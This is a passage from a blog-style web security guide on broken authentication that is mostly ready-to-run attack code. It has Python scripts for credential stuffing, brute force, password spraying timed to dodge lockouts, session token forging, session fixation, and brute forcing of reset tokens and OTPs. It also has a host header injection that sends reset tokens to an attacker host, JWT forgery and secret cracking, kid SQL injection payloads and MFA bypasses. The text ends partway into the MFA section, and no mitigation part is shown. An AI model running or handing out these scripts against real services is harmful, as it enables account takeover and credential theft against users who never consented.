---
title: "Broken Authentication — A Complete Guide"
description: "A comprehensive guide to understanding, exploiting, and mitigating broken authentication vulnerabilities in modern web applications."
date: 2024-01-20 10:00:00 +0000
categories: [Web Security, Vulnerabilities]
tags: [authentication, broken-auth, web-security, owasp, bug-bounty, penetration-testing]
pin: true
math: false
mermaid: true

---

## What is Broken Authentication?

**Broken Authentication** refers to a class of vulnerabilities where an application's authentication and session management mechanisms are implemented incorrectly, allowing attackers to **compromise passwords, keys, session tokens**, or exploit other implementation flaws to assume other users' identities — temporarily or permanently.

Broken Authentication was ranked **#2 in OWASP Top 10 (2017)** and is now part of **[OWASP A07:2021 — Identification and Authentication Failures](https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/)**, reflecting how widespread and devastating these flaws remain across modern web applications.

Common manifestations include:

- **Credential stuffing** — using leaked username/password lists
- **Brute force attacks** — guessing weak passwords with no rate limiting
- **Session fixation** — forcing a known session ID onto a victim
- **Session hijacking** — stealing active session tokens
- **Weak or predictable session tokens** — tokens that can be guessed or forged
- **Insecure "Remember Me" tokens** — persistent tokens stored insecurely
- **Password reset flaws** — predictable tokens, host header injection, token leakage
- **Multi-factor authentication bypasses** — logic flaws in MFA implementation
- **JWT vulnerabilities** — algorithm confusion, weak secrets, none algorithm
- **OAuth misconfigurations** — state parameter bypass, open redirects

---

## Simple Analogy

Imagine a hotel where every guest gets a room key. **Broken Authentication** is like:

- The hotel giving out **master keys that never expire**
- The key being **the guest's name** — easily guessable
- The hotel having **no limit** on how many times you can try wrong keys
- A key that **works in any room** because validation is skipped
- Staff handing out **duplicate keys** based on just a phone call

Any of these flaws lets an attacker walk into rooms they should never access.

---

## How Does Broken Authentication Work?

### Overall Attack Flow

```mermaid
flowchart TD
    A[Attacker] --> B{Authentication Attack Type}

    B --> C[Credential Stuffing]
    B --> D[Brute Force]
    B --> E[Session Hijacking]
    B --> F[Password Reset Abuse]
    B --> G[JWT Attack]
    B --> H[MFA Bypass]
    B --> I[OAuth Flaw]

    C --> J[Leaked credential databases]
    D --> K[No rate limiting / lockout]
    E --> L[XSS / Network sniffing / Predictable tokens]
    F --> M[Weak token / Host header injection]
    G --> N[None algorithm / Weak secret / Key confusion]
    H --> O[Response manipulation / Code leakage / Logic flaw]
    I --> P[State bypass / Open redirect / Token leakage]

    J --> Q[Account Takeover]
    K --> Q
    L --> Q
    M --> Q
    N --> Q
    O --> Q
    P --> Q

    Q --> R[Data Breach / Privilege Escalation / Full Compromise]

    style A fill:#e74c3c,stroke:#c0392b,color:#fff
    style Q fill:#c0392b,stroke:#922b21,color:#fff
    style R fill:#922b21,stroke:#6e2318,color:#fff
```

### Authentication Flow — Normal vs Attacked

```mermaid
sequenceDiagram
    participant U as Legitimate User
    participant A as Attacker
    participant S as Server

    Note over U,S: Normal Authentication Flow
    U->>S: POST /login (username + password)
    S->>S: Validate credentials
    S-->>U: Set-Cookie: session=s3cur3R4nd0mT0k3n
    U->>S: GET /dashboard (Cookie: session=s3cur3R4nd0mT0k3n)
    S-->>U: 200 OK — Dashboard

    Note over A,S: Broken Authentication Attack
    A->>S: POST /login (admin:password123) — Brute Force
    S-->>A: 200 OK — No lockout!
    A->>S: GET /dashboard (Cookie: session=1) — Predictable token
    S-->>A: 200 OK — Admin Dashboard!
```

---

## Authentication Weakness Map

```mermaid
mindmap
  root((Broken Authentication))
    Credential Attacks
      Credential Stuffing
      Brute Force
      Password Spraying
      Default Credentials
    Session Flaws
      Predictable Tokens
      Session Fixation
      Session Hijacking
      No Expiry
      Insecure Storage
    Password Reset
      Weak Tokens
      Host Header Injection
      Token in Referrer
      Token Reuse
      No Expiry
    JWT Vulnerabilities
      None Algorithm
      Weak Secret
      Algorithm Confusion
      Kid Injection
      JWK Header Injection
    MFA Bypass
      Response Manipulation
      Code Reuse
      Brute Force OTP
      Backup Code Abuse
      SIM Swapping
    OAuth Flaws
      State Parameter Missing
      Open Redirect
      Token Leakage
      PKCE Bypass
      Implicit Flow Abuse
```

---

## Scenario 1: Credential Stuffing

Attackers use **leaked username/password pairs** from previous data breaches to log into other services, exploiting users who reuse passwords.

### Attack Flow

```mermaid
sequenceDiagram
    participant A as Attacker
    participant DB as Leaked DB (HaveIBeenPwned)
    participant T as Target App

    A->>DB: Download leaked credentials (e.g., 10M pairs)
    A->>A: Filter and prepare wordlist
    loop For each credential pair
        A->>T: POST /login (email:password)
        T-->>A: 200 OK (success) or 401 (fail)
    end
    A->>T: Login with valid pair found
    T-->>A: Session token — Account Takeover!
```

### Manual Test

```http
POST /api/auth/login HTTP/1.1
Host: vulnerable-app.com
Content-Type: application/json

{
  "email": "john.doe@example.com",
  "password": "Summer2020!"
}
```

**Response — Successful credential stuffing:**

```http
HTTP/1.1 200 OK
Set-Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...; HttpOnly

{
  "message": "Login successful",
  "user": {
    "id": 1042,
    "email": "john.doe@example.com",
    "role": "admin"
  }
}
```

### Automated Credential Stuffing PoC

```python
#!/usr/bin/env python3
"""
Credential Stuffing PoC
Use only on authorized targets.
"""

import requests
import time
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed

TARGET_URL    = "https://vulnerable-app.com/api/auth/login"
CREDS_FILE    = "leaked_creds.txt"   # Format: email:password per line
THREADS       = 10
DELAY         = 0.5                  # Seconds between requests
SUCCESS_CODES = [200]
SUCCESS_TEXT  = "Login successful"

session = requests.Session()
session.headers.update({
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
})

found_accounts = []

def try_login(email, password):
    try:
        r = session.post(
            TARGET_URL,
            json={"email": email, "password": password},
            timeout=10
        )
        if r.status_code in SUCCESS_CODES and SUCCESS_TEXT in r.text:
            return email, password, r.cookies.get("session"), True
        return email, password, None, False
    except Exception as e:
        return email, password, None, False

def load_credentials(filepath):
    creds = []
    with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            line = line.strip()
            if ":" in line:
                parts = line.split(":", 1)
                creds.append((parts[0], parts[1]))
    return creds

def main():
    print(f"[*] Loading credentials from {CREDS_FILE}...")
    creds = load_credentials(CREDS_FILE)
    print(f"[*] Loaded {len(creds)} credential pairs")
    print(f"[*] Target: {TARGET_URL}")
    print("-" * 60)

    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        futures = {
            executor.submit(try_login, email, password): (email, password)
            for email, password in creds
        }
        for future in as_completed(futures):
            email, password, token, success = future.result()
            if success:
                print(f"[+] VALID: {email}:{password} | Token: {token}")
                found_accounts.append((email, password, token))
            time.sleep(DELAY)

    print("-" * 60)
    print(f"[*] Found {len(found_accounts)} valid accounts")

if __name__ == "__main__":
    main()
```

---

## Scenario 2: Brute Force — No Rate Limiting

The application has **no lockout, no CAPTCHA, and no rate limiting** on the login endpoint.

### Attack Flow

```mermaid
graph LR
    A[Attacker] -->|1000 requests/minute| B[/api/login]
    B -->|No rate limit| C{Password correct?}
    C -->|No| D[Try next password]
    C -->|Yes| E[Account Compromised!]
    D -->|Loop| B

    style A fill:#e74c3c,stroke:#c0392b,color:#fff
    style E fill:#c0392b,stroke:#922b21,color:#fff
    style B fill:#f39c12,stroke:#e67e22,color:#fff
```

### Brute Force with ffuf

```bash
# Generate password list
cat > passwords.txt << 'EOF'
password
password123
Password1
123456
admin
letmein
welcome
Summer2023!
Winter2023!
Company123!
EOF

# Brute force with ffuf
ffuf -u https://vulnerable-app.com/api/login \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"FUZZ"}' \
  -w passwords.txt \
  -mc 200 \
  -fs 0 \
  -v
```

### Brute Force with Python (Burp-style)

```python
#!/usr/bin/env python3
"""
Login Brute Force PoC
Use only on authorized targets.
"""

import requests
import sys

TARGET  = "https://vulnerable-app.com/api/login"
USER    = "admin@company.com"
PWLIST  = "rockyou-top10000.txt"

headers = {
    "Content-Type": "application/json",
    "X-Forwarded-For": "127.0.0.1"   # Attempt IP rotation bypass
}

def brute_force(username, wordlist):
    with open(wordlist, "r", encoding="utf-8", errors="ignore") as f:
        passwords = [line.strip() for line in f if line.strip()]

    print(f"[*] Brute forcing {username} with {len(passwords)} passwords...")

    for i, password in enumerate(passwords, 1):
        try:
            r = requests.post(
                TARGET,
                json={"username": username, "password": password},
                headers=headers,
                timeout=10
            )

            if r.status_code == 200 and "token" in r.text:
                print(f"\n[+] PASSWORD FOUND: {password}")
                print(f"[+] Response: {r.text[:200]}")
                return password

            if i % 100 == 0:
                print(f"[*] Tried {i}/{len(passwords)} passwords...", end="\r")

        except requests.exceptions.RequestException as e:
            print(f"[-] Error: {e}")
            continue

    print("[-] Password not found in wordlist")
    return None

if __name__ == "__main__":
    brute_force(USER, PWLIST)
```

### Password Spraying

```python
#!/usr/bin/env python3
"""
Password Spraying — Try one password against many usernames.
Avoids lockout by staying under the threshold per account.
"""

import requests
import time

TARGET    = "https://vulnerable-app.com/api/login"
USERLIST  = "employees.txt"   # Harvested from LinkedIn, company website
PASSWORDS = [
    "Company2024!",
    "Welcome1!",
    "Summer2024",
    "Password1!",
    "January2024!"
]
DELAY_BETWEEN_SPRAYS = 1800  # 30 minutes between password rounds (avoid lockout)

def spray(usernames, password):
    print(f"\n[*] Spraying password: {password}")
    valid = []
    for user in usernames:
        try:
            r = requests.post(
                TARGET,
                json={"username": user, "password": password},
                timeout=10
            )
            if r.status_code == 200 and "token" in r.text:
                print(f"[+] VALID: {user} : {password}")
                valid.append((user, password))
            time.sleep(2)  # Small delay between users
        except Exception:
            pass
    return valid

def main():
    with open(USERLIST) as f:
        users = [line.strip() for line in f if line.strip()]

    print(f"[*] Loaded {len(users)} usernames")
    all_valid = []

    for i, password in enumerate(PASSWORDS):
        hits = spray(users, password)
        all_valid.extend(hits)
        if i < len(PASSWORDS) - 1:
            print(f"[*] Waiting {DELAY_BETWEEN_SPRAYS}s before next spray round...")
            time.sleep(DELAY_BETWEEN_SPRAYS)

    print(f"\n[*] Total valid accounts: {len(all_valid)}")
    for user, pw in all_valid:
        print(f"    {user} : {pw}")

if __name__ == "__main__":
    main()
```

---

## Scenario 3: Predictable / Weak Session Tokens

The application generates **sequential or easily guessable session tokens**.

### Token Analysis Flow

```mermaid
graph TD
    A[Collect Multiple Session Tokens] --> B{Analyze Entropy}
    B -->|Sequential| C[Token = UserID or Timestamp]
    B -->|Low entropy| D[Token = MD5 of username+time]
    B -->|Pattern found| E[Enumerate/Forge tokens]
    C --> E
    D --> E
    E --> F[Access other user sessions]
    F --> G[Account Takeover]

    style A fill:#3498db,stroke:#2980b9,color:#fff
    style G fill:#c0392b,stroke:#922b21,color:#fff
```

### Detecting Weak Tokens

```python
#!/usr/bin/env python3
"""
Session Token Entropy Analyzer
Collect tokens and check for patterns or weak entropy.
"""

import requests
import hashlib
import base64
import math
import re
from collections import Counter

TARGET_URL = "https://vulnerable-app.com/api/login"
SAMPLE_SIZE = 20

def calculate_entropy(token):
    """Calculate Shannon entropy of a token string."""
    if not token:
        return 0
    freq = Counter(token)
    length = len(token)
    entropy = -sum(
        (count / length) * math.log2(count / length)
        for count in freq.values()
    )
    return entropy * length  # Total bits

def collect_tokens(n):
    """Collect n session tokens from the target."""
    tokens = []
    for i in range(n):
        r = requests.post(
            TARGET_URL,
            json={"username": f"testuser{i}", "password": "testpass"}
        )
        token = r.cookies.get("session") or r.json().get("token")
        if token:
            tokens.append(token)
    return tokens

def analyze_tokens(tokens):
    print(f"\n[*] Analyzing {len(tokens)} tokens:\n")
    for i, token in enumerate(tokens):
        entropy = calculate_entropy(token)
        print(f"  Token {i+1:>2}: {token[:40]}... | Entropy: {entropy:.1f} bits")

    # Check for sequential patterns
    print("\n[*] Checking for sequential patterns...")
    for i in range(len(tokens) - 1):
        t1 = tokens[i]
        t2 = tokens[i + 1]
        if abs(len(t1) - len(t2)) < 2:
            # Check if numeric part differs by 1
            nums1 = re.findall(r'\d+', t1)
            nums2 = re.findall(r'\d+', t2)
            if nums1 and nums2:
                for n1, n2 in zip(nums1, nums2):
                    if int(n2) - int(n1) == 1:
                        print(f"  [!] SEQUENTIAL pattern detected between token {i+1} and {i+2}")

    # Check for base64-encoded predictable data
    print("\n[*] Checking for base64 encoded data...")
    for token in tokens:
        try:
            decoded = base64.b64decode(token + "==").decode("utf-8", errors="ignore")
            if re.search(r'[a-zA-Z]{3,}', decoded):
                print(f"  [!] Possible base64 decoded value: {decoded[:80]}")
        except Exception:
            pass

def main():
    print("[*] Collecting session tokens...")
    tokens = collect_tokens(SAMPLE_SIZE)
    analyze_tokens(tokens)

if __name__ == "__main__":
    main()
```

### Forging Sequential Tokens

```python
#!/usr/bin/env python3
"""
Sequential Session Token Forger.
If tokens are user IDs or incrementing numbers, enumerate them all.
"""

import requests

TARGET    = "https://vulnerable-app.com/api/dashboard"
BASE_ID   = 1000   # Known token (e.g., from your own account)
RANGE     = 500    # Enumerate tokens around the known one

hits = []

for token_id in range(BASE_ID - RANGE, BASE_ID + RANGE):
    cookies = {"session": str(token_id)}
    r = requests.get(TARGET, cookies=cookies, timeout=5)
    if r.status_code == 200 and "dashboard" in r.text.lower():
        print(f"[+] Valid session found: token={token_id}")
        hits.append(token_id)

print(f"\n[*] Total valid sessions: {len(hits)}")
```

---

## Scenario 4: Session Fixation

The attacker **sets a known session ID** on the victim's browser before they log in. After the victim authenticates, the server uses the same (now privileged) session ID.

### Attack Flow

```mermaid
sequenceDiagram
    participant A as Attacker
    participant V as Victim
    participant S as Server

    A->>S: GET /login
    S-->>A: Set-Cookie: session=KNOWN_SESSION_ID
    A->>V: Send crafted URL with known session ID
    Note over V: Victim clicks link with session=KNOWN_SESSION_ID
    V->>S: GET /login?sessionid=KNOWN_SESSION_ID
    S->>S: Uses attacker's session ID (no rotation!)
    V->>S: POST /login (valid credentials)
    S->>S: Authenticates but keeps SAME session ID!
    S-->>V: Logged in as victim
    A->>S: GET /dashboard (Cookie: session=KNOWN_SESSION_ID)
    S-->>A: Victim's account data — Takeover!
```

### Session Fixation PoC

```python
#!/usr/bin/env python3
"""
Session Fixation Attack PoC
"""

import requests

TARGET_BASE = "https://vulnerable-app.com"
FIXED_SESSION = "attacker_controlled_session_abc123"

# Step 1: Set the known session ID on the victim's browser
# (Usually done via URL parameter, XSS, or subdomain cookie injection)
print(f"[*] Fixed session ID: {FIXED_SESSION}")
print(f"[*] Send victim this URL:")
print(f"    {TARGET_BASE}/login?sessionid={FIXED_SESSION}")
print(f"    or via XSS: document.cookie='session={FIXED_SESSION};path=/'")

# Step 2: Wait for victim to log in...
input("\n[*] Press Enter after victim has logged in...")

# Step 3: Use the same session ID to access victim's account
print("[*] Attempting to access victim session...")
cookies = {"session": FIXED_SESSION}
r = requests.get(f"{TARGET_BASE}/api/me", cookies=cookies)

if r.status_code == 200:
    print(f"[+] Session fixation SUCCESS!")
    print(f"[+] Victim data: {r.text[:500]}")
else:
    print(f"[-] Failed: {r.status_code}")
```

---

## Scenario 5: Password Reset Vulnerabilities

### 5a. Weak / Predictable Reset Tokens

```mermaid
graph TD
    A[Request Password Reset] --> B[Server generates token]
    B --> C{How is token generated?}
    C -->|MD5 of email+timestamp| D[Predictable — brute-forceable]
    C -->|Short 4-6 digit code| E[Brute-forceable with no rate limit]
    C -->|Sequential number| F[Enumerable]
    C -->|Cryptographically random| G[Secure]
    D --> H[Attacker forges token]
    E --> H
    F --> H
    H --> I[Reset any account password]
    I --> J[Account Takeover]

    style G fill:#2ecc71,stroke:#27ae60,color:#fff
    style J fill:#c0392b,stroke:#922b21,color:#fff
    style H fill:#e74c3c,stroke:#c0392b,color:#fff
```

**Detecting weak reset tokens:**

```python
#!/usr/bin/env python3
"""
Password Reset Token Analyzer & Brute Forcer
"""

import requests
import hashlib
import time
import itertools
import string

TARGET_RESET_REQ  = "https://vulnerable-app.com/api/auth/forgot-password"
TARGET_RESET_USE  = "https://vulnerable-app.com/api/auth/reset-password"
TARGET_EMAIL      = "victim@example.com"
ATTACKER_EMAIL    = "attacker@example.com"

def request_reset_and_get_token(email):
    """Request reset and capture token if reflected in response."""
    r = requests.post(TARGET_RESET_REQ, json={"email": email})
    print(f"[*] Reset response: {r.text}")
    # Check if token is in response (common mistake)
    return r

def brute_force_4digit_otp(email):
    """Brute force a 4-digit OTP sent to email."""
    print(f"[*] Brute forcing 4-digit OTP for {email}...")
    for i in range(10000):
        code = f"{i:04d}"
        r = requests.post(TARGET_RESET_USE, json={
            "email": email,
            "token": code,
            "new_password": "Hacked123!"
        })
        if r.status_code == 200 and "success" in r.text.lower():
            print(f"[+] VALID OTP: {code}")
            return code
        if i % 500 == 0:
            print(f"[*] Tried {i}/10000...", end="\r")
    return None

def try_md5_token(email):
    """
    Try predictable MD5-based tokens.
    Some apps generate: md5(email + timestamp_rounded_to_minute)
    """
    print(f"[*] Trying MD5-based predictable tokens...")
    now = int(time.time())

    # Try last 10 minutes of timestamps
    for offset in range(0, 600, 1):
        ts = now - offset
        # Common patterns:
        candidates = [
            hashlib.md5(f"{email}{ts}".encode()).hexdigest(),
            hashlib.md5(f"{email}{ts // 60}".encode()).hexdigest(),  # Per minute
            hashlib.md5(email.encode()).hexdigest()[:8],              # Just email
        ]
        for token in candidates:
            r = requests.post(TARGET_RESET_USE, json={
                "email": email,
                "token": token,
                "new_password": "Hacked123!"
            })
            if r.status_code == 200 and "success" in r.text.lower():
                print(f"[+] VALID TOKEN: {token} (timestamp offset: -{offset}s)")
                return token
    print("[-] No MD5 token match found")
    return None

if __name__ == "__main__":
    request_reset_and_get_token(ATTACKER_EMAIL)
    brute_force_4digit_otp(TARGET_EMAIL)
    try_md5_token(TARGET_EMAIL)
```

---

### 5b. Host Header Injection in Password Reset

The application uses the `Host` header to construct the reset link, which the attacker controls.

```http
POST /forgot-password HTTP/1.1
Host: attacker.com
Content-Type: application/json

{"email": "victim@example.com"}
```

**What the server sends to the victim:**

```text
Subject: Reset your password

Click here to reset your password:
http://attacker.com/reset?token=VALID_TOKEN_HERE

This link expires in 24 hours.
```

The victim clicks the link, their token goes to `attacker.com`, and the attacker resets their password.

```python
#!/usr/bin/env python3
"""
Host Header Injection — Password Reset PoC
"""

import requests

TARGET      = "https://vulnerable-app.com/forgot-password"
VICTIM_EMAIL = "victim@company.com"
ATTACKER_HOST = "evil.attacker.com"

# Method 1: Direct Host header injection
headers_1 = {
    "Host": ATTACKER_HOST,
    "Content-Type": "application/json"
}

# Method 2: X-Forwarded-Host header (common proxy bypass)
headers_2 = {
    "Host": "vulnerable-app.com",
    "X-Forwarded-Host": ATTACKER_HOST,
    "Content-Type": "application/json"
}

# Method 3: X-Host header
headers_3 = {
    "Host": "vulnerable-app.com",
    "X-Host": ATTACKER_HOST,
    "Content-Type": "application/json"
}

# Method 4: Absolute URL in Host
headers_4 = {
    "Host": f"vulnerable-app.com@{ATTACKER_HOST}",
    "Content-Type": "application/json"
}

payloads = [
    ("Direct Host", headers_1),
    ("X-Forwarded-Host", headers_2),
    ("X-Host", headers_3),
    ("Host with @", headers_4),
]

for method, headers in payloads:
    print(f"\n[*] Trying: {method}")
    try:
        r = requests.post(
            TARGET,
            json={"email": VICTIM_EMAIL},
            headers=headers,
            timeout=10
        )
        print(f"    Status: {r.status_code}")
        print(f"    Response: {r.text[:200]}")
        if r.status_code == 200:
            print(f"    [!] Check {ATTACKER_HOST} for incoming token!")
    except Exception as e:
        print(f"    Error: {e}")
```

---

### 5c. Password Reset Token in Referer Header

```http
GET /reset-password?token=SECRET_TOKEN_HERE HTTP/1.1
Host: vulnerable-app.com
Referer: https://vulnerable-app.com/reset-password?token=SECRET_TOKEN_HERE
```

If the reset page loads **third-party resources** (analytics, ads, CDN), the token leaks via the `Referer` header.

---

## Scenario 6: JWT Vulnerabilities

### JWT Structure

```mermaid
graph LR
    A["Header\n{alg: HS256, typ: JWT}"] -->|base64url| D[Token]
    B["Payload\n{sub: user123, role: user}"] -->|base64url| D
    C["Signature\nHMAC-SHA256(header.payload, secret)"] -->|base64url| D

    style A fill:#3498db,stroke:#2980b9,color:#fff
    style B fill:#2ecc71,stroke:#27ae60,color:#fff
    style C fill:#e74c3c,stroke:#c0392b,color:#fff
    style D fill:#f39c12,stroke:#e67e22,color:#fff
```

### 6a. None Algorithm Attack

```python
#!/usr/bin/env python3
"""
JWT None Algorithm Attack
Removes the signature so the server accepts any payload.
"""

import base64
import json

def b64url_encode(data):
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

def b64url_decode(data):
    padding = 4 - len(data) % 4
    return base64.urlsafe_b64decode(data + "=" * padding)

def decode_jwt(token):
    parts = token.split(".")
    header  = json.loads(b64url_decode(parts[0]))
    payload = json.loads(b64url_decode(parts[1]))
    return header, payload

def forge_none_algorithm(original_token, new_payload):
    """
    Forge a JWT using 'none' algorithm — no signature needed.
    Try variations: none, None, NONE, nOnE
    """
    results = []
    for alg in ["none", "None", "NONE", "nOnE"]:
        header = {"alg": alg, "typ": "JWT"}
        forged_header  = b64url_encode(json.dumps(header, separators=(",", ":")))
        forged_payload = b64url_encode(json.dumps(new_payload, separators=(",", ":")))
        # No signature
        forged_token = f"{forged_header}.{forged_payload}."
        results.append((alg, forged_token))
    return results

# Example usage
original_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyMTIzIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3MDAwMDAwMDB9.SomeSignatureHere"

# Decode original
header, payload = decode_jwt(original_token)
print(f"[*] Original header:  {header}")
print(f"[*] Original payload: {payload}")

# Escalate privilege
payload["role"] = "admin"
payload["sub"]  = "admin"

print(f"\n[*] Forged payload: {payload}")
print(f"\n[*] None algorithm tokens:")

forged_tokens = forge_none_algorithm(original_token, payload)
for alg, token in forged_tokens:
    print(f"\n  alg={alg}")
    print(f"  Token: {token}")
```

---

### 6b. JWT Weak Secret Brute Force

```bash
# Using hashcat to crack JWT secret
# First, get a valid JWT token
TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyMTIzIn0.SomeSignature"

# Crack with rockyou wordlist
hashcat -a 0 -m 16500 "$TOKEN" /usr/share/wordlists/rockyou.txt

# Using jwt-cracker (Node.js tool)
jwt-cracker -t "$TOKEN" -w /usr/share/wordlists/rockyou.txt

# Using john the ripper
echo "$TOKEN" > jwt.txt
john --wordlist=/usr/share/wordlists/rockyou.txt jwt.txt
```

```python
#!/usr/bin/env python3
"""
JWT Secret Brute Forcer
"""

import hmac
import hashlib
import base64
import sys

def b64url_encode(data):
    if isinstance(data, (dict, str)):
        data = data.encode() if isinstance(data, str) else data
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

def verify_jwt_secret(token, secret):
    """Try a secret against a JWT token."""
    parts = token.split(".")
    if len(parts) != 3:
        return False
    header_payload = f"{parts[0]}.{parts[1]}"
    expected_sig = parts[2]
    computed_sig = hmac.new(
        secret.encode(),
        header_payload.encode(),
        hashlib.sha256
    ).digest()
    computed_b64 = base64.urlsafe_b64encode(computed_sig).rstrip(b'=').decode()
    return computed_b64 == expected_sig

def crack_jwt(token, wordlist_path):
    print(f"[*] Cracking JWT: {token[:50]}...")
    with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
        for i, line in enumerate(f):
            secret = line.strip()
            if verify_jwt_secret(token, secret):
                print(f"\n[+] SECRET FOUND: '{secret}'")
                return secret
            if i % 10000 == 0:
                print(f"[*] Tried {i} secrets...", end="\r")
    print("\n[-] Secret not found")
    return None

if __name__ == "__main__":
    TOKEN    = sys.argv[1] if len(sys.argv) > 1 else "YOUR_JWT_HERE"
    WORDLIST = sys.argv[2] if len(sys.argv) > 2 else "/usr/share/wordlists/rockyou.txt"
    crack_jwt(TOKEN, WORDLIST)
```

---

### 6c. Algorithm Confusion (RS256 → HS256)

When a server uses RS256 (asymmetric), the public key is often **publicly accessible**. An attacker can trick the server into using HS256 and sign the token with the **public key as the HMAC secret**.

```python
#!/usr/bin/env python3
"""
JWT Algorithm Confusion Attack: RS256 -> HS256
Uses the server's public key as the HMAC secret.
"""

import jwt
import json
import base64
import requests

# Step 1: Obtain the server's public key (usually from /jwks.json or /.well-known/jwks.json)
PUBLIC_KEY_URL = "https://vulnerable-app.com/.well-known/jwks.json"

def get_public_key(url):
    r = requests.get(url)
    jwks = r.json()
    key = jwks["keys"][0]
    print(f"[*] Got public key: {key}")
    return key

def algorithm_confusion_attack(original_token, public_key_pem, new_payload):
    """
    Sign a JWT with HS256 using the RSA public key as the HMAC secret.
    Many vulnerable servers will verify HS256 tokens using the public key.
    """
    # Force HS256 algorithm
    forged_token = jwt.encode(
        new_payload,
        public_key_pem,
        algorithm="HS256",
        headers={"alg": "HS256", "typ": "JWT"}
    )
    return forged_token

# Example
PUBLIC_KEY_PEM = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA...
-----END PUBLIC KEY-----"""

ORIGINAL_TOKEN = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9..."

new_payload = {
    "sub": "admin",
    "role": "administrator",
    "iat": 1700000000,
    "exp": 9999999999
}

forged = algorithm_confusion_attack(ORIGINAL_TOKEN, PUBLIC_KEY_PEM, new_payload)
print(f"[+] Forged token (HS256 with public key): {forged}")
```

---

### 6d. JWT kid (Key ID) SQL Injection

```python
#!/usr/bin/env python3
"""
JWT kid Header SQL Injection
The 'kid' parameter is used in a SQL query to fetch the signing key.
Inject SQL to make the server use an empty/known key.
"""

import jwt
import json
import base64

# Vulnerable server code (for reference):
# key = db.query(f"SELECT key FROM keys WHERE id = '{kid}'")
# If kid is injectable, we can make it return a known value

# Payload to forge
payload = {
    "sub": "admin",
    "role": "administrator",
    "exp": 9999999999
}

# SQL injection in kid — makes DB return empty string as key
# We then sign with empty string
kid_sqli_payloads = [
    "' UNION SELECT '' --",
    "' UNION SELECT '0' --",
    "0 UNION SELECT 'secret' --",
    "../../dev/null",           # Path traversal variant
    "/dev/null",                # Use empty file as key
]

for kid_payload in kid_sqli_payloads:
    # Try signing with empty secret (if SQL returns empty)
    try:
        token = jwt.encode(
            payload,
            "",   # Empty string as secret (what SQL injection would return)
            algorithm="HS256",
            headers={"alg": "HS256", "kid": kid_payload}
        )
        print(f"[*] kid={kid_payload}")
        print(f"    Token: {token[:80]}...")
    except Exception as e:
        print(f"[-] Error with kid={kid_payload}: {e}")
```

---

## Scenario 7: Multi-Factor Authentication (MFA) Bypass

### MFA Bypass Attack Vectors

```mermaid
graph TD
    A[MFA Challenge] --> B{Bypass Method}

    B --> C[Response Manipulation]
    B --> D[Code Brute Force]
    B --> E[Code Reuse]
    B --> F[Skip MFA Step]
    B --> G[Backup Code Abuse]
    B --> H[SIM Swap / SS7]

    C --> C1["Change 'mfa_required: true' to false"]
    D --> D1[No rate limit on OTP endpoint]
    E --> E1[OTP valid for more than 30 seconds]
    F --> F1[Directly access /dashboard after login step 1]
    G --> G1[Brute force backup codes - usually 8 digits]
    H --> H1[Social engineer carrier - redirect SMS]

    C1 --> Z[MFA Bypassed — Full Account Access]
    D1 --> Z
    E1 --> Z
    F1 --> Z
    G1 --> Z
    H1 --> Z

    style A fill:#3498db,stroke:#2980b9,color:#fff
    style Z fill:#c0392b,stroke:#922b21,color:#fff
```

### 7a. Response Manipulation Bypass

```http
POST /api/auth/mfa/verify HTTP/1.1
Host: vulnerable-app.com
Content-Type: application/json
Cookie: pre_auth_session=abc123

{"code": "000000"}
```

**Normal failure response:**

```json
{
  "success": false,
  "mfa_verified": false,
  "message": "Invalid code"
}
```

**Manipulated response (intercept with Burp and change):**

```json
{
  "success": true,
  "mfa_verified": true,
  "message": "Code verified"
}
```

```python
#!/usr/bin/env python3
"""
MFA Bypass via Response Manipulation PoC
Use Burp Suite in practice — this script demonstrates the concept.
"""

import requests
from unittest.mock import patch
import json

TARGET_MFA   = "https://vulnerable-app.com/api/auth/mfa/verify"
TARGET_DASH  = "https://vulnerable-app.com/api/dashboard"
PRE_AUTH_COOKIE = {"pre_auth_session": "YOUR_PRE_AUTH_SESSION"}

# Attempt 1: Send wrong code and see if server trusts client-side state
print("[*] Testing MFA bypass via wrong code...")
r = requests.post(
    TARGET_MFA,
    json={"code": "000000"},
    cookies=PRE_AUTH_COOKIE
)
print(f"[*] MFA response: {r.status_code} — {r.text[:200]}")

# Attempt 2: Try accessing protected endpoint directly (skip MFA step)
print("\n[*] Testing MFA step skip — direct dashboard access...")
r2 = requests.get(TARGET_DASH, cookies=PRE_AUTH_COOKIE)
if r2.status_code == 200:
    print(f"[+] MFA BYPASSED via step skip!")
    print(f"[+] Dashboard: {r2.text[:300]}")
else:
    print(f"[-] Step skip failed: {r2.status_code}")
```

---

### 7b. OTP Brute Force

```python
#!/usr/bin/env python3
"""
OTP Brute Force — 6 digit TOTP with no rate limiting.
"""

import requests
import time

TARGET_MFA    = "https://vulnerable-app.com/api/auth/mfa"
PRE_AUTH_SESS = "pre_auth_session_token_here"
DELAY         = 0.1  # seconds between attempts

def brute_force_otp(session_token):
    print("[*] Brute forcing 6-digit OTP (0-999999)...")
    cookies = {"pre_auth_session": session_token}

    for code in range(1000000):
        otp = f"{code:06d}"
        try:
            r = requests.post(
                TARGET_MFA,
                json={"otp": otp},
                cookies=cookies,
                timeout=10
            )
            if r.status_code == 200 and "success" in r.text.lower():
                print(f"\n[+] VALID OTP FOUND: {otp}")
                print(f"[+] Response: {r.text}")
                return otp

            if code % 1000 == 0:
                print(f"[*] Progress: {code}/999999", end="\r")

        except requests.exceptions.RequestException:
            time.sleep(1)

    print("\n[-] OTP not found")
    return None

